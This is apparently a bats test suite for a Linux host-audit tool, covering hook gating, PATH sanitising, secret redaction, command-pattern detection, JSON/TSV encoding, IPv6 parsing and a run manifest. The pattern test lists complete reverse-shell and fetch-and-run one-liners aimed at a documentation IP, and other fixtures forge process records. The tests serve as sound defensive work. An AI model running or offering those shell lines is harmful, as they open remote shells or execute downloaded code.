#!/usr/bin/env bats
# Security hardening of the Linux collectors: test-hook gating, trusted PATH, secret redaction,
# command-pattern coverage, injective JSON encoding, TSV row forgery, IPv6 and the run manifest.
# Fixtures are synthetic; nothing here modifies the host.

load test_helper

setup() {
  make_root
  use_fake_tools
}

# --------------------------------------------------------------------- test-hook gating

@test "hooks: without BO_TEST_MODE the BO_ROOT hook is ignored, recorded and exit 6" {
  # The environment points the audit at a fake host; production mode must audit the real one.
  OUT="${BATS_TEST_TMPDIR}/prod.json"
  status=0
  env -u BO_TEST_MODE BO_ROOT="${ROOT}" "${AUDIT}" --modules system --json --quiet >"${OUT}" 2>/dev/null || status=$?
  [ "${status}" -eq 6 ]
  has_error TEST_HOOKS_IGNORED
  # The fixture's hostname must not appear: the real host was read.
  [ "$(json_py "d['host']['hostname']")" != "$(cat "${ROOT}/etc/hostname")" ]
  [ "$(json_py "'test_mode' in d['host']")" = "False" ]
}

@test "hooks: BO_FORCE_MISSING_TOOLS alone is also ignored without test mode" {
  OUT="${BATS_TEST_TMPDIR}/prod.json"
  env -u BO_TEST_MODE -u BO_ROOT BO_FORCE_MISSING_TOOLS="sha256sum" "${AUDIT}" --modules system --json --quiet >"${OUT}" 2>/dev/null || true
  has_error TEST_HOOKS_IGNORED
}

@test "hooks: with BO_TEST_MODE=1 the hooks work and the report says test_mode" {
  run_audit --modules system
  [ "$(json_py "d['host']['test_mode']")" = "True" ]
  refute has_error TEST_HOOKS_IGNORED
}

@test "hooks: a normal production run has no test_mode flag and no hook error" {
  OUT="${BATS_TEST_TMPDIR}/prod.json"
  env -u BO_TEST_MODE -u BO_ROOT -u BO_FORCE_MISSING_TOOLS "${AUDIT}" --modules system --json --quiet >"${OUT}" 2>/dev/null || true
  [ "$(json_py "'test_mode' in d['host']")" = "False" ]
  refute has_error TEST_HOOKS_IGNORED
}

# ------------------------------------------------------------------------- trusted PATH

@test "path: writable, relative and missing PATH entries are dropped and recorded" {
  evil="${BATS_TEST_TMPDIR}/evil"
  mkdir -p "${evil}"
  chmod 777 "${evil}"
  printf '#!/bin/sh\ntouch "%s/ran"\n' "${BATS_TEST_TMPDIR}" >"${evil}/df"
  chmod 755 "${evil}/df"
  OUT="${BATS_TEST_TMPDIR}/prod.json"
  env -u BO_TEST_MODE -u BO_ROOT -u BO_FORCE_MISSING_TOOLS PATH=".:relative/bin:/nonexistent:${evil}:${PATH}" \
    "${AUDIT}" --modules system --json --quiet >"${OUT}" 2>/dev/null || true
  has_error PATH_SANITIZED
  [ ! -e "${BATS_TEST_TMPDIR}/ran" ]
  [[ "$(json_py "[e['message'] for e in d['errors'] if e['code']=='PATH_SANITIZED'][0]")" == *"${evil}"* ]]
}

@test "path: a clean PATH records nothing" {
  OUT="${BATS_TEST_TMPDIR}/prod.json"
  env -u BO_TEST_MODE -u BO_ROOT -u BO_FORCE_MISSING_TOOLS PATH="/usr/bin:/bin" "${AUDIT}" --modules system --json --quiet >"${OUT}" 2>/dev/null || true
  refute has_error PATH_SANITIZED
}

# -------------------------------------------------------------------- secret redaction

redacted_hides() { # INPUT SECRET : the secret must not survive, the command name must
  local out
  out="$(printf '%s' "$1" | bo_redact)"
  [[ "${out}" != *"$2"* ]] || {
    echo "leaked '$2' in: ${out}" >&2
    return 1
  }
}

@test "redact: credentials in common command-line forms are removed" {
  source "${REPO_ROOT}/linux/lib/common.sh"
  redacted_hides 'mysql -u root -pHunter2Secret db' Hunter2Secret
  redacted_hides 'mysqldump --host h -pHunter2Secret' Hunter2Secret
  redacted_hides 'sshpass -p Hunter2Secret ssh host' Hunter2Secret
  redacted_hides 'sshpass -e -p Hunter2Secret ssh host' Hunter2Secret
  redacted_hides 'curl -u admin:Hunter2Secret http://x' Hunter2Secret
  redacted_hides 'curl --user admin:Hunter2Secret http://x' Hunter2Secret
  redacted_hides 'curl -H "Authorization: Bearer abc.Hunter2Secret.xyz" http://x' Hunter2Secret
  redacted_hides 'curl -H "authorization: Basic Hunter2Secret==" http://x' Hunter2Secret
  redacted_hides 'wget https://user:Hunter2Secret@host/f' Hunter2Secret
  redacted_hides 'psql postgresql://u:Hunter2Secret@h/db' Hunter2Secret
  redacted_hides 'app --password=Hunter2Secret' Hunter2Secret
  redacted_hides 'app --api-key Hunter2Secret' Hunter2Secret
  redacted_hides 'env AWS_SECRET_ACCESS_KEY=Hunter2Secret app' Hunter2Secret
  redacted_hides 'PGPASSWORD=Hunter2Secret psql' Hunter2Secret
  redacted_hides 'app token: Hunter2Secret' Hunter2Secret
}

@test "redact: ordinary arguments are left untouched" {
  source "${REPO_ROOT}/linux/lib/common.sh"
  for line in 'docker run -u 1000:1000 img' 'ssh -p 2222 host' 'ls -p /tmp' 'mysql --version' \
    'mysql -h db1 -u root' 'curl -s -o out http://example.test/file' 'nc -z host 22' \
    'rsync -av a/ b/' 'grep -p pattern file' 'sshpass -V'; do
    [ "$(printf '%s' "${line}" | bo_redact)" = "${line}" ] || {
      echo "changed: ${line}" >&2
      return 1
    }
  done
}

# --------------------------------------------------------------- suspicious command lines

@test "patterns: reverse/bind-shell forms the old patterns missed are flagged" {
  source "${REPO_ROOT}/linux/lib/common.sh"
  # shellcheck disable=SC2016 # the quoted text is the command line under test, not shell code
  for line in 'ncat --exec /bin/sh 203.0.113.9 9001' 'ncat -l 9001 --sh-exec /bin/bash' \
    'socat TCP:203.0.113.9:9001 SYSTEM:/bin/sh' 'nc 203.0.113.9 4444 | /bin/sh' \
    'nc -l 4444 | bash' '/bin/sh -i 2>&1 | nc 203.0.113.9 9001' \
    'mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 203.0.113.9 9 >/tmp/f' \
    'bash <(curl -s http://203.0.113.9/a.sh)' 'source <(wget -qO- http://203.0.113.9/a)' \
    'perl -MIO -e "$p=fork;exit,if($p);"' 'perl -e "use Socket;socket(S,PF_INET,SOCK_STREAM,0)"' \
    'python3 -c "import pty;pty.spawn(\"/bin/sh\")"' \
    'openssl s_client -quiet -connect 203.0.113.9:443 | /bin/sh'; do
    [ -n "$(bo_suspicious_reasons "${line}")" ] || {
      echo "missed: ${line}" >&2
      return 1
    }
  done
}

@test "patterns: ordinary uses of the same tools stay quiet" {
  source "${REPO_ROOT}/linux/lib/common.sh"
  for line in 'nc -z db1 5432' 'ncat -l 8080' 'nc -w 3 mail 25' 'curl -s http://example.test | tar xz' \
    'curl -sSf http://example.test -o out' 'diff <(ls a) <(ls b)' 'bash -c "echo hi"' \
    'ssh host cat /etc/hostname' 'perl -e "print 1"' 'python3 -m http.server 8000' \
    'openssl s_client -connect example.test:443 </dev/null' 'telnet localhost 25'; do
    [ -z "$(bo_suspicious_reasons "${line}")" ] || {
      echo "false positive: ${line}: $(bo_suspicious_reasons "${line}")" >&2
      return 1
    }
  done
}

# -------------------------------------------------------------------- JSON and TSV safety

@test "json: different non-ASCII names stay different and the output parses" {
  source "${REPO_ROOT}/linux/lib/common.sh"
  export LC_ALL=C # the collectors always run in the C locale (bo_cli_main exports it)
  a="$(bo_json_str "$(printf 'caf\xc3\xa9')")"
  b="$(bo_json_str "$(printf 'caf\xc3\xbc')")"
  [ "${a}" != "${b}" ]
  [ "${a}" = '"caf\u00c3\u00a9"' ]
  python3 -c 'import json,sys; [json.loads(x) for x in sys.argv[1:]]' "${a}" "${b}"
}

@test "tsv: tabs, newlines and carriage returns cannot add columns or rows" {
  source "${REPO_ROOT}/linux/lib/common.sh"
  [ "$(bo_tsv_field $'a\tb\nc\rd')" = "a b c d" ]
}

@test "processes: a command line containing a newline cannot forge inventory records" {
  d="${ROOT}/proc/500"
  mkdir -p "${d}"
  printf '500 (evilbin) S 200 500 500 0 -1 0 1 0 0 0 0 0 0 0 20 0 1 0 1 1 1\n' >"${d}/stat"
  printf 'Name:\tevilbin\nUid:\t0\t0\t0\t0\n' >"${d}/status"
  ln -s /tmp/evilbin "${d}/exe"
  printf '/tmp/evilbin\0--x\n999\t1\troot\tsshd\t/usr/sbin/sshd\tsshd -D\0' >"${d}/cmdline"
  run_audit --modules processes
  # the planted "pid 999 root sshd" row must not exist; the real sshd (pid 100) is untouched
  [ "$(json_py "[r['volatile'].get('pid') for r in d['inventory']['records'] if r['key']=='process:root:sshd']")" = "['100']" ]
  [ "$(json_py "any(r.get('volatile',{}).get('pid')=='999' for r in d['inventory']['records'])")" = "False" ]
  [ "$(json_py "[r['attrs']['exe'] for r in d['inventory']['records'] if r['key']=='process:root:evilbin'][0]")" = "/tmp/evilbin" ]
}

@test "processes: a comm name containing a tab stays one column" {
  d="${ROOT}/proc/501"
  mkdir -p "${d}"
  printf '501 (a\tb) S 200 501 501 0 -1 0 1 0 0 0 0 0 0 0 20 0 1 0 1 1 1\n' >"${d}/stat"
  printf 'Name:\ta\n Uid:\t0\t0\t0\t0\n' >"${d}/status"
  ln -s /usr/bin/true "${d}/exe"
  printf '/usr/bin/true\0' >"${d}/cmdline"
  run_audit --modules processes
  [ "$(json_py "[r['attrs']['comm'] for r in d['inventory']['records'] if r['volatile'].get('pid')=='501'][0]")" = "a b" ]
}

# -------------------------------------------------------------------------------- IPv6

write_tcp6() { # entries (hex address:port) ...
  mkdir -p "${ROOT}/proc/net"
  {
    echo "  sl  local_address                         remote_address                        st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode"
    local n=0 a
    for a in "$@"; do
      printf '   %d: %s 00000000000000000000000000000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 %d 1 0000000000000000 100 0 0 10 0\n' "${n}" "${a}" "$((1000 + n))"
      n=$((n + 1))
    done
  } >"${ROOT}/proc/net/tcp6"
}

@test "ipv6: /proc/net/tcp6 addresses decode to the text form ss prints" {
  write_tcp6 00000000000000000000000001000000:0277 00000000000000000000000000000000:0016 \
    0000000000000000FFFF00000100007F:1F90 B80D01200000000067452301EFCDAB89:01BB
  BO_FORCE_MISSING_TOOLS="ss netstat ip route ifconfig systemd-detect-virt" run_audit --modules network
  for k in 'listener:tcp/::1/631' 'listener:tcp/::/22' 'listener:tcp/::ffff:127.0.0.1/8080' \
    'listener:tcp/2001:db8::123:4567:89ab:cdef/443'; do
    [ "$(json_py "'${k}' in [r['key'] for r in d['inventory']['records']]")" = "True" ] || {
      echo "missing key ${k}" >&2
      return 1
    }
  done
}

@test "ipv6: loopback forms are not reported as exposed services" {
  write_tcp6 00000000000000000000000001000000:0CEA 0000000000000000FFFF00000100007F:0CEB
  BO_FORCE_MISSING_TOOLS="ss netstat ip route ifconfig systemd-detect-virt" run_audit --modules network
  no_finding NET-EXPOSE-001
  no_finding NET-EXPOSE-002
}

# ----------------------------------------------------------------------------- manifest

@test "manifest: --output-dir writes manifest.json with matching SHA-256 values, owner-only" {
  OUTDIR="${BATS_TEST_TMPDIR}/out"
  run_audit --modules system --output-dir "${OUTDIR}"
  rd="$(find "${OUTDIR}" -mindepth 1 -maxdepth 1 -type d | head -n 1)"
  [ -f "${rd}/manifest.json" ]
  [ "$(bo_mode_of "${rd}/manifest.json")" = "600" ]
  [ "$(bo_mode_of "${rd}")" = "700" ]
  python3 - "${rd}" <<'EOF'
import hashlib, json, os, sys
rd = sys.argv[1]
m = json.load(open(os.path.join(rd, "manifest.json")))
assert m["kind"] == "run-manifest" and m["hash_algorithm"] == "sha256" and m["complete"] is True
paths = {f["path"] for f in m["files"]}
assert paths == {"report.json", "report.txt", "run.log"}, paths
for f in m["files"]:
    data = open(os.path.join(rd, f["path"]), "rb").read()
    assert hashlib.sha256(data).hexdigest() == f["sha256"], f["path"]
    assert len(data) == f["size"]
assert any(c["path"].endswith("lib/common.sh") and len(c["sha256"]) == 64 for c in m["collector"])
assert m["run"]["id"] == json.load(open(os.path.join(rd, "report.json")))["run"]["id"]
EOF
}

@test "manifest: a missing hash tool gives null digests and complete=false, never invented values" {
  OUTDIR="${BATS_TEST_TMPDIR}/out"
  BO_FORCE_MISSING_TOOLS="ip route ifconfig netstat systemd-detect-virt sha256sum shasum openssl" run_audit --modules system --output-dir "${OUTDIR}"
  rd="$(find "${OUTDIR}" -mindepth 1 -maxdepth 1 -type d | head -n 1)"
  python3 - "${rd}" <<'EOF'
import json, os, sys
m = json.load(open(os.path.join(sys.argv[1], "manifest.json")))
assert m["complete"] is False and all(f["sha256"] is None for f in m["files"])
EOF
}
